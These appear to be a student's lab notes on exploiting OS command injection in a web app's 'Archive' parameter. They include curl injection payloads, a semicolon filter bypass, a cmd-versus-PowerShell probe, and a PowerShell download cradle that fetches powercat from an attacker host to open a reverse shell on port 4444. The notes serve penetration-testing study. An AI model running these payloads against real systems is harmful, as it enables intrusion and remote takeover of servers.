If we can input some sort of command line instruction (such as `git clone`), then we can guess that may the OS on server side is executing that command on their side. Using Burp we can analyse and confirm this:

*It uses the archive parameter to parse the request*

Thus we can do `curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive` to inject our own command. We would also need to find out which folder to upload (also from Burp).

If command fails we can try to bypass, KNOWING what commands are allowed so instead we can do `curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive`, using a semicolon as command separator, to see if it's executed. 

On Windows Machine, we can use this `
`(dir 2>&1 *`\``|echo CMD);&<# rem #>echo PowerShell` and it will output whether we are working with pwsh or cmd. Curl command ends up being `curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive`

`cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .`
	Windows' Netcat to generate a reverse shell. Start a python server to make this script available.

Within the script `IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell` is the actual reverse shell command, with the first line being a powershell download cradle?
	**-c** to specify where to connect, **-p** for the port, and **-e** for executing a program.
*Reverse shell should be obtained after we listen and curl the .ps1 script*
